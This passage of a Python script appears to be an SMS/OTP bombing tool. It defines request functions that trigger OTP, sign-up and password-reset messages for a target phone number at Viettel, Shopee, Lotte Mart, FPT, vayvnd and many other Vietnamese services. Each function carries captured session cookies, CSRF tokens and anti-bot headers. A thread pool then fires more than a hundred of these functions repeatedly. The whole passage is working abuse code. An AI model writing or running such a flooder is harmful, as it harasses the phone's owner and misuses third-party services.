        'x-xsrf-token': 'eyJpdiI6Ik9HaHJsckU3enNLSlE3aFpDZXFnQ2c9PSIsInZhbHVlIjoiS1wvQU5PR3dQVTNJT2hzQlAraGtyUG5ZRlZocVdcL1ZadmNtdzB5Y01TVDQ3elBkUE5YYzVBdzZWZWNWaVE5Z2FxIiwibWFjIjoiMDYyOWY3MjdkN2ExNTZiNDRkZGRmZDcwZTM4NDM4MThjMDJlMjQwODJmNTZkY2UxOWFkMjBiODA2OGFkNzU3ZSJ9',
    }

    json_data = {
        'msisdn': sdt,
        'type': 'register',
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)

def vayvnd():
    cookies = {
        '_gcl_au': '1.1.159155953.1740193244',
        '_ga': 'GA1.1.788540782.1740193245',
        '_ga_P2783EHVX2': 'GS1.1.1740193245.1.1.1740193258.47.0.0',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '_gcl_au=1.1.159155953.1740193244; _ga=GA1.1.788540782.1740193245; _ga_P2783EHVX2=GS1.1.1740193245.1.1.1740193258.47.0.0',
        'origin': 'https://vayvnd.vn',
        'priority': 'u=1, i',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    json_data = {
        'login': sdt,
        'trackingId': 'WsAKVtkJREOvEJZv3qGc6LujN0LGRdtZmNaPqfbvSBrDD7Dbt5BW1v1hD9ryhbuF',
    }

    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)

def shopee():
    cookies = {
        '__LOCALE__null': 'VN',
        '_gcl_au': '1.1.842924999.1740193478',
        '_fbp': 'fb.1.1740193480024.52133732977988533',
        'csrftoken': 'K1Am5FQHt0zmmxHZLZ5ggbdg6lMETxyx',
        '_QPWSDCXHZQA': '81947bfd-1bc8-4437-fdce-230b436a0215',
        'REC7iLP4Q': '5d170ef2-1f30-457b-b2ea-2c632b0fb625',
        '_sapid': '5b6d30f6905389915e30fcf470ccc8d881637cebcda27c2942d38ecc',
        'SPC_T_ID': 'jDIBr0NbYTn1YP9cOk68CtupUAoWnki2cnR73c4jIZAlw+iGzyrXuoSaSrIa1HYc/u8rd2FQuoZW/gdpgermuIs+T2wQRCqx0xGZfa2GNaCrTP/QZZroLdhvYkhxs228BeeV3V4z0G3EcOSdOIbmLHaQHGGz9ZYqrplJehhnQH0=',
        'SPC_T_IV': 'NWR4a1IyaGpaVkVZajVkeQ==',
        'SPC_SI': 'ABGsZwAAAABRaTVCdTJEam3WWAAAAAAAZ0x6eG9jSDI=',
        'SPC_SEC_SI': 'v1-bXBMVzVxbHN0RHgxQkZZY4Z9Y7AYy3dGMaasLfmSn5Bb2JhcpI5ORlAQ4CGp2oSIqjLrP5fPRkJIp136V1sWB2kIMgfzV4jWg98n3YOT7L0=',
        'SPC_F': '4p1aYV094dEWjwE77OdI6l1sQ80837vW',
        'REC_T_ID': 'c35c95b5-f0c9-11ef-af93-86931937eac4',
        'SPC_R_T_ID': 'jDIBr0NbYTn1YP9cOk68CtupUAoWnki2cnR73c4jIZAlw+iGzyrXuoSaSrIa1HYc/u8rd2FQuoZW/gdpgermuIs+T2wQRCqx0xGZfa2GNaCrTP/QZZroLdhvYkhxs228BeeV3V4z0G3EcOSdOIbmLHaQHGGz9ZYqrplJehhnQH0=',
        'SPC_R_T_IV': 'NWR4a1IyaGpaVkVZajVkeQ==',
        'AMP_TOKEN': '%24NOT_FOUND',
        '_gid': 'GA1.2.1982040405.1740193491',
        'shopee_webUnique_ccd': 'Dk9peOPP9mTI7hweHjJ2Dw%3D%3D%7CRIFJiLy8BTIBv7kExLCaWydIoX85pz4uvujeuEYjQ9h384rKy1xGxL6FXYfBV2xgFwjAYzIXNyeWwps%3D%7CjSVa5C6rucmm6ALU%7C08%7C3',
        'ds': 'ad0499b826b0c4954081bceaf45e5528',
        '_ga': 'GA1.1.1449486291.1740193490',
        '_dc_gtm_UA-61914164-6': '1',
        '_ga_4GPP1ZXG63': 'GS1.1.1740193490.1.1.1740194070.6.0.0',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'af-ac-enc-dat': '1a655bdb05f8b5e2',
        'af-ac-enc-sz-token': 'Dk9peOPP9mTI7hweHjJ2Dw==|RIFJiLy8BTIBv7kExLCaWydIoX85pz4uvujeuEYjQ9h384rKy1xGxL6FXYfBV2xgFwjAYzIXNyeWwps=|jSVa5C6rucmm6ALU|08|3',
        'content-type': 'application/json',
        # 'cookie': '__LOCALE__null=VN; _gcl_au=1.1.842924999.1740193478; _fbp=fb.1.1740193480024.52133732977988533; csrftoken=K1Am5FQHt0zmmxHZLZ5ggbdg6lMETxyx; _QPWSDCXHZQA=81947bfd-1bc8-4437-fdce-230b436a0215; REC7iLP4Q=5d170ef2-1f30-457b-b2ea-2c632b0fb625; _sapid=5b6d30f6905389915e30fcf470ccc8d881637cebcda27c2942d38ecc; SPC_T_ID=jDIBr0NbYTn1YP9cOk68CtupUAoWnki2cnR73c4jIZAlw+iGzyrXuoSaSrIa1HYc/u8rd2FQuoZW/gdpgermuIs+T2wQRCqx0xGZfa2GNaCrTP/QZZroLdhvYkhxs228BeeV3V4z0G3EcOSdOIbmLHaQHGGz9ZYqrplJehhnQH0=; SPC_T_IV=NWR4a1IyaGpaVkVZajVkeQ==; SPC_SI=ABGsZwAAAABRaTVCdTJEam3WWAAAAAAAZ0x6eG9jSDI=; SPC_SEC_SI=v1-bXBMVzVxbHN0RHgxQkZZY4Z9Y7AYy3dGMaasLfmSn5Bb2JhcpI5ORlAQ4CGp2oSIqjLrP5fPRkJIp136V1sWB2kIMgfzV4jWg98n3YOT7L0=; SPC_F=4p1aYV094dEWjwE77OdI6l1sQ80837vW; REC_T_ID=c35c95b5-f0c9-11ef-af93-86931937eac4; SPC_R_T_ID=jDIBr0NbYTn1YP9cOk68CtupUAoWnki2cnR73c4jIZAlw+iGzyrXuoSaSrIa1HYc/u8rd2FQuoZW/gdpgermuIs+T2wQRCqx0xGZfa2GNaCrTP/QZZroLdhvYkhxs228BeeV3V4z0G3EcOSdOIbmLHaQHGGz9ZYqrplJehhnQH0=; SPC_R_T_IV=NWR4a1IyaGpaVkVZajVkeQ==; AMP_TOKEN=%24NOT_FOUND; _gid=GA1.2.1982040405.1740193491; shopee_webUnique_ccd=Dk9peOPP9mTI7hweHjJ2Dw%3D%3D%7CRIFJiLy8BTIBv7kExLCaWydIoX85pz4uvujeuEYjQ9h384rKy1xGxL6FXYfBV2xgFwjAYzIXNyeWwps%3D%7CjSVa5C6rucmm6ALU%7C08%7C3; ds=ad0499b826b0c4954081bceaf45e5528; _ga=GA1.1.1449486291.1740193490; _dc_gtm_UA-61914164-6=1; _ga_4GPP1ZXG63=GS1.1.1740193490.1.1.1740194070.6.0.0',
        'origin': 'https://shopee.vn',
        'priority': 'u=1, i',
        'referer': 'https://shopee.vn/buyer/login/otp?next=https%3A%2F%2Fshopee.vn%2F',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-api-source': 'pc',
        'x-csrftoken': 'K1Am5FQHt0zmmxHZLZ5ggbdg6lMETxyx',
        'x-requested-with': 'XMLHttpRequest',
        'x-sap-ri': '1c41b96788c5e741fb976632050118e2cc04090fd1d6304ebe18',
        'x-sap-sec': 'F1lP9AvVAOUIuh0OqOqOqhiO3OuEqs+OUOqxqEkO7BnYqIYO9OtBqsYOxOnlqrqOWOqOqodOHOuCqJ0OmOqOqsqOffuWqkyOzOqCqkaOSOnDqEYOYOnWq4YOXWn/qhoO0Wq0qo+OtOqsqE1OLOnfqJYOuWnxqJqOCft+qo0OLWq6qooO1OuiqOqOvOtQq4kOgOq1qeoOLBnsqOkOVfqhqrYODftHqhiOqOqOqExCrWgls3qOqOtcXP4DqOqOYAsXYlHp4OtAIqV0wfnt8dcWrr1OqOnVdRYrqOqIE33UB7TOIECGMg9LI7dO+c1ncOqOqJwEqfqOqOnOFjqrqOq11IsZi308JkvJ9irLiZe9qOt4slnuP4qOqhc1eOTOqh7QYeYW7Xl6jOqOqEgsBtpWqfqOqOuDo80rqOnIMIxIUO1OqHYkqOtH1oiTHRKQV5YrqOtO8SuXaOTOqsYVpzYOqS7PUOTOqOuv4HCCqWqOqOtuVf5Pp5+zXVcDhczgpBOspSaIqOqOHDhWWv4OqOqJFgjUIqW2KoBjGl7Enp45Qq28wFjqasj1ZnGA4O2BEM6wNZgJ/4rk0lcGxffDlFXc5j8yQVZok3BKy8Mxxha+SgNvfUmTsgAE1O1fa5PySC/2Poh4OXLXVOUhXPw54Bypy6Rs+njBnedmUqErVFFDLIOAwUfpBMnN18dEf8gRk6O+glxhpsfi8+ZxJ+1HS8SYX6qC6YL4DRciY2vtQrsPK4M6vsL/t4G5BESpg5A0nk5SQGpKgUarp9wQ0m6ky8p8gbVhPFZ0CJSUYftkqBqOyCk3KkURv3N2Vz12aVdeQQYjt/ecmE+5zvHXDZhA9Jvq3losciV5urVPypuNkrci49c2btDEsKqRsVNBbB9yD9lRERrZUqQ6XdExe/JmVf6tXmmocMSRtTTLdy9HtK+/u80Ap3e/h6swXoxAKhowJBSIwytWpLU8603bl/TJpF22Py1JKoPPuFiqgyehLB8+D9+UZgQvRxxTILYseLxtNUS/3p3T7g6ABsJhksxLI+ORJ7YkgRl3fLMI7SBXvQZyZ5FpQikfAIVnZozKikQmrAHaPDcXK2rh8E043ex9hQnTgcQGMJlj3h0CMwXr/pCzTjuLBs3esatAw8gVXvrxVNMcX8eschmqfeMEMf7BnzRG+YV+nTgjyKYsjhl9FQN7/k6bxWIUGtRdZ7SqgDVHkjceEBPg/rEfBdDhCfyldO61iKaSNU8nDN4G0FAr5olr7eBwSn6uW6XciI2bD3SbKFSrACrUeTeHluD2e1up2VqzwC8QfpV4PEQIQbUzxfnIrE0uvCX3Z7c4jR3n5nyHPLlr59CMjI+6gbhv0W2TQdGXc1PE8P9P+E++EbG4E6u7Dw7/gAItfzrkWEpwx492kpZGqOqIqOqOzH9kOOoOqOusVFpr5sOTFO9OqOnpSBqOuOqOqpKFYg1OqOqOqWqOqsfkqOqDqOqO+qNQwLjglIhZOJwIHdwaG1vnvI34W90ONoRM1vVfWIsiOBicqOqOqOSOqOnXrJkIH+2Dxw+OqOqQqOqODniidumOMfhIrh6EeMPHo9Ji901sqOqOAywTTju8TTaOqOqOnOqOqetEARGfCQkUufqOqpBXYcCMX+iO',
        'x-shopee-language': 'vi',
        'x-sz-sdk-version': '1.12.15',
    }

    json_data = {
        'phone': sdt,
        'force_channel': True,
        'm_token': '',
        'captcha_signature': '',
        'operation': 7,
        'channel': 1,
        'supported_channels': [
            1,
            2,
            3,
            6,
            0,
            5,
        ],
        'support_session': True,
    }

    response = requests.post('https://shopee.vn/api/v4/otp/send_vcode', cookies=cookies, headers=headers, json=json_data)
def speedlotte():
    cookies = {
        '_ga': 'GA1.1.98793953.1739946609',
        'localConsent': 'true',
        'aws-waf-token': 'e08ee5a1-11ad-4b23-afbc-dea50a232da2:BgoAvSJfOxUtAAAA:LE3AY/3ocX+/LfFV6nkcEFZcf7+nftiaH234yQsVyUrz9noh/zT4QwFq0GOiC106g98mei6tBc8AlGFD94OeU8QHvlj9XkKLcdIZO8gq5qor1kqnjxEF2Gs0P0JJsgr30bXTg6c3D7sw07L/sZ/iL20P1DfEe5G8rf22TetD6XEuLPQonk0pB1x30hrvZLKj+G+i',
        '__Host-next-auth.csrf-token': 'f8e37b011f293b944c9c927edc97763b58f13a6b0cdfa3c588dc525c1abcfc0a%7C940810494c2303b060d3ad3c2b6ee16e6c591a8e54bcc48edc570a16ebe9cd13',
        '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
        '_gcl_au': '1.1.77833110.1739946607.1220168010.1740321916.1740321933',
        '_ga_6QLJ7DM4XW': 'GS1.1.1740321915.3.1.1740321934.41.0.0',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'content-type': 'application/json',
        # 'cookie': '_ga=GA1.1.98793953.1739946609; localConsent=true; aws-waf-token=e08ee5a1-11ad-4b23-afbc-dea50a232da2:BgoAvSJfOxUtAAAA:LE3AY/3ocX+/LfFV6nkcEFZcf7+nftiaH234yQsVyUrz9noh/zT4QwFq0GOiC106g98mei6tBc8AlGFD94OeU8QHvlj9XkKLcdIZO8gq5qor1kqnjxEF2Gs0P0JJsgr30bXTg6c3D7sw07L/sZ/iL20P1DfEe5G8rf22TetD6XEuLPQonk0pB1x30hrvZLKj+G+i; __Host-next-auth.csrf-token=f8e37b011f293b944c9c927edc97763b58f13a6b0cdfa3c588dc525c1abcfc0a%7C940810494c2303b060d3ad3c2b6ee16e6c591a8e54bcc48edc570a16ebe9cd13; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _gcl_au=1.1.77833110.1739946607.1220168010.1740321916.1740321933; _ga_6QLJ7DM4XW=GS1.1.1740321915.3.1.1740321934.41.0.0',
        'origin': 'https://www.lottemart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'x-appcheck-token': 'eyJraWQiOiJqN09vemciLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjcxMjk3MTkwMDMyOTp3ZWI6YzdiZDdmODk3NTY4YWQ5ZjhjMjBiOCIsImF1ZCI6WyJwcm9qZWN0c1wvNzEyOTcxOTAwMzI5IiwicHJvamVjdHNcL2xvdHRlbWFydC0zODMzMTIiXSwicHJvdmlkZXIiOiJyZWNhcHRjaGFfdjMiLCJpc3MiOiJodHRwczpcL1wvZmlyZWJhc2VhcHBjaGVjay5nb29nbGVhcGlzLmNvbVwvNzEyOTcxOTAwMzI5IiwiZXhwIjoxNzQwNDA4MzQ5LCJpYXQiOjE3NDAzMjE5NDksImp0aSI6IjZTZkxfLWVMS2ZCYWR6ZTZFektONkZJVmtqUjdpbU1rRnl5Z08wWXNqQ3MifQ.PSV_6ZGD8oapBiGPZYyZcepLdWI7SkBchnN3NZ27zl1KWBCPhROqh2gQfi3Xc3DrdO5AOOGDzu8z2T9d4wDTRkKbND4K2oNIAgF1-Mwh6JG1RJviX6l4BtiCyLlOEjswa89ijLoUEXKGdTARxD7yZDdfPc2WXgQLK_fDVaZDR6BVWFcPgHKoTSHaxNHrCnWuETp4MmHQ-IcUmYCSnfAmXm40b6Q3bNx-z_scVOrLA8NM1rrmbo09f4XERnGpmRkI0xryKBbYTQuQHlIlWdfb-Owis-wHJKaQQHXUgllIJHT_tNFC0KS5AnNOzUOFyKxMiLcq8Lz_msJ-E7NgLFuXC6tk4Hzizz9e6-Y-zjqnHl6DrzW3N7LiKqhlYJIESeoQHxcJMsX6fSEd6m_c4IPfqHZZP7I40osAp14M1gVu-CN0k6U2aWT27q7a3-4AxOWaO6msl_BWKH02PafXPCrvaUMfSNaz-QwkvhMAQE70gs0zHW-of13GQjvB6Rt-klxT',
    }

    json_data = {
        'username': sdt,
        'case': 'register',
    }

    response = requests.post(
        'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

def fpt():
    cookies = {
        'INGRESSCOOKIE': '1740322627.981.42.742812|7fba285e5548cf27d0d7a70b981762e8',
        'fptid-antiforgery': 'CfDJ8K4dvrnRzclGrO7gfc8sD9KsIVhr-sX1dLqehJejh3ak5Thx8pkciaj5Yf_K8HN4nr2tR4RysLMqXAqvad4VSdif4xSWaGxp1sex35JIXF364iltps5ZeBBBdtDWQhBBu-wszqGsumVgEGSGxVk019A',
        'fptid-session': 'CfDJ8K4dvrnRzclGrO7gfc8sD9JX1jrOz9BZcvymVo86DmA9yWzORjHD13Ub2QifarcogFHltRWOImhlVbuDgM396bAdzr4nto22OU70Ddq0GvctTuvHGb3u2%2Fm0FoZiujtwIvPNubOofsgK9YxIql6K4rcBajENt%2B0jObFtPtI7R%2BLs',
        'oauth2_authentication_csrf_insecure': 'MTc0MDMyMjY1MHxEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJRFF4TURSbE5XWTROVEE1T0RRM01qVTVNakkxWTJFd1pqZGxPREkwTW1FMny2pLBsj1GRGnLdzSmKHld5mthQ6aYl745BOPTmL4wJww==',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': 'INGRESSCOOKIE=1740322627.981.42.742812|7fba285e5548cf27d0d7a70b981762e8; fptid-antiforgery=CfDJ8K4dvrnRzclGrO7gfc8sD9KsIVhr-sX1dLqehJejh3ak5Thx8pkciaj5Yf_K8HN4nr2tR4RysLMqXAqvad4VSdif4xSWaGxp1sex35JIXF364iltps5ZeBBBdtDWQhBBu-wszqGsumVgEGSGxVk019A; fptid-session=CfDJ8K4dvrnRzclGrO7gfc8sD9JX1jrOz9BZcvymVo86DmA9yWzORjHD13Ub2QifarcogFHltRWOImhlVbuDgM396bAdzr4nto22OU70Ddq0GvctTuvHGb3u2%2Fm0FoZiujtwIvPNubOofsgK9YxIql6K4rcBajENt%2B0jObFtPtI7R%2BLs; oauth2_authentication_csrf_insecure=MTc0MDMyMjY1MHxEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJRFF4TURSbE5XWTROVEE1T0RRM01qVTVNakkxWTJFd1pqZGxPREkwTW1FMny2pLBsj1GRGnLdzSmKHld5mthQ6aYl745BOPTmL4wJww==',
        'Origin': 'https://accounts.fpt.vn',
        'Referer': 'https://accounts.fpt.vn/sso/Auth/Identifier?challenge=eb96f0759f0741eaa77c6cbce9856b39',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'CfDJ8K4dvrnRzclGrO7gfc8sD9JjXKJKAGAWG_EeSX1fy2SnlsRlDNqMnj6oNOW0YpIkWYoAmM5E2Qu9Vw2MEXzXWVMbPEQ8OFzoBTLnBIj7GnpGagPovGEMytZ9PkObc6iq1e1mR1kH-XGm6DDfrSqp2eY',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'Username': sdt,
        'Challenge': 'eb96f0759f0741eaa77c6cbce9856b39',
    }

    response = requests.post('https://accounts.fpt.vn/sso/partial/username', cookies=cookies, headers=headers, json=json_data)
def viettelcodinh():
    cookies = {
        '_ga': 'GA1.1.332055932.1740138928',
        '_ga_ZN9X6XYDZV': 'GS1.1.1740138927.1.1.1740139007.0.0.0',
        '_ga_3VWGCVHCP6': 'GS1.1.1740138928.1.1.1740139007.0.0.0',
        '_gcl_au': '1.1.320986385.1740142817',
        'laravel_session': 'hBziVWGY24CZQxcrByJUkvwomiNKDAhfRwWXB6dE',
        'redirectLogin': 'https://viettel.vn/lan-toa/goi-cuoc?kh=cuonglm12_cnkd_hcm',
        '_ga_4FDYZCBWCZ': 'GS1.1.1740322993.1.0.1740322993.60.0.0',
        '_ga_VH8261689Q': 'GS1.1.1740322994.2.1.1740322995.59.0.0',
        '_ga_Z30HDXVFSV': 'GS1.1.1740322995.2.1.1740322995.0.0.0',
        'XSRF-TOKEN': 'eyJpdiI6Im1zV1FhSzJycUFLa2NaUEFnQTBGY2c9PSIsInZhbHVlIjoiXC9cL0lMREQzSE1DVEhCamxcL1lEdGRKeXdrdXhKOHY2d0tUVmd0MGF3NnZySUNPVHRYNnRKRFpxOHpKS0h6bldLRiIsIm1hYyI6ImY2ZTJlMThjYzI0MjJmZTQyODU2OGFmNzE5MzgxMmE1YTZhMmQ3NDBkYWZjZmJmYzhhMzI4NzM5MDM4YTAxODgifQ%3D%3D',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'content-type': 'application/json;charset=UTF-8',
        # 'cookie': '_ga=GA1.1.332055932.1740138928; _ga_ZN9X6XYDZV=GS1.1.1740138927.1.1.1740139007.0.0.0; _ga_3VWGCVHCP6=GS1.1.1740138928.1.1.1740139007.0.0.0; _gcl_au=1.1.320986385.1740142817; laravel_session=hBziVWGY24CZQxcrByJUkvwomiNKDAhfRwWXB6dE; redirectLogin=https://viettel.vn/lan-toa/goi-cuoc?kh=cuonglm12_cnkd_hcm; _ga_4FDYZCBWCZ=GS1.1.1740322993.1.0.1740322993.60.0.0; _ga_VH8261689Q=GS1.1.1740322994.2.1.1740322995.59.0.0; _ga_Z30HDXVFSV=GS1.1.1740322995.2.1.1740322995.0.0.0; XSRF-TOKEN=eyJpdiI6Im1zV1FhSzJycUFLa2NaUEFnQTBGY2c9PSIsInZhbHVlIjoiXC9cL0lMREQzSE1DVEhCamxcL1lEdGRKeXdrdXhKOHY2d0tUVmd0MGF3NnZySUNPVHRYNnRKRFpxOHpKS0h6bldLRiIsIm1hYyI6ImY2ZTJlMThjYzI0MjJmZTQyODU2OGFmNzE5MzgxMmE1YTZhMmQ3NDBkYWZjZmJmYzhhMzI4NzM5MDM4YTAxODgifQ%3D%3D',
        'origin': 'https://viettel.vn',
        'priority': 'u=1, i',
        'referer': 'https://viettel.vn/lan-toa/goi-cuoc?kh=cuonglm12_cnkd_hcm',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'x-csrf-token': 'Sl1s14MXeTgqV1H4v4mm11Agj9rreoefzTEthLLu',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': 'eyJpdiI6Im1zV1FhSzJycUFLa2NaUEFnQTBGY2c9PSIsInZhbHVlIjoiXC9cL0lMREQzSE1DVEhCamxcL1lEdGRKeXdrdXhKOHY2d0tUVmd0MGF3NnZySUNPVHRYNnRKRFpxOHpKS0h6bldLRiIsIm1hYyI6ImY2ZTJlMThjYzI0MjJmZTQyODU2OGFmNzE5MzgxMmE1YTZhMmQ3NDBkYWZjZmJmYzhhMzI4NzM5MDM4YTAxODgifQ==',
    }

    json_data = {
        'phone': sdt,
    }

    response = requests.post('https://viettel.vn/api/getPervasiveOtpLogin', cookies=cookies, headers=headers, json=json_data)
functions = [
    tv360, vieon, myviettel, fptshop, befood, foodhubzl,
    vttelecom, vinwonders, hasaki, fahasa, medigozl,
    medigosms, mocha, liena, viettelpost, ghtk, vuihoc,
    vnsc, goldenspoonssms, bibomart, guardian, speedlotte,
    zl188, goldenspoonszl, goldenspoonszlresend,  vietloan,
    goldenspoonssmsresend, hoangphuc, trungsoncarezl, viettelcodinh,
    trungsoncaresms, kkfashion, thecoffeehouse, homeid,
    hasaki, cathayliferesend, vietmoney, vietmoneycall,
    hoangnghia, cellphones, vnsolution, phuclong, fpt,
    aeonmall, vinschool, highlands, meeyland, vayvnd,
    vinfastescooter, taskal, star_t, thinkpro, nhadatvui,
    ivie, mocha35, thuongdo, unica, monkeyjunior, call,
    ngheluon, babilala, edupia, vkids, mytv, bsmart,
    cathaylife, prepedu, bigm, timnha24h, atmnha, ivnd,
    dynaminds, gicula, dalatbds, mocha2, jupviec, guvi,
    aio, fpt, money24h, unicar, lozido, pingpush, ting,
    jobsgo, kanow, butlsms, butlzl, ilokafood, vieclam24h,
    viecco, sobanhangzl, sobanhang, tourism, sfin, sapo,
    truedoc, longchau1, longchau, bibabo, pizza, wastons,
    best, mocha1, one, pnj, PNJ1, vietmoney, vieton,
    best1, vntour, mafc, myviettel, shopee, shine
]

with concurrent.futures.ThreadPoolExecutor() as executor:
    for i in range(count):
        for func in functions:
            # Gọi hàm và gửi vào ThreadPoolExecutor
            executor.submit(func)
            # Nghỉ giữa các lần gọi hàm
            time.sleep(0.2)  # Điều chỉnh thời gian nghỉ tùy theo nhu cầu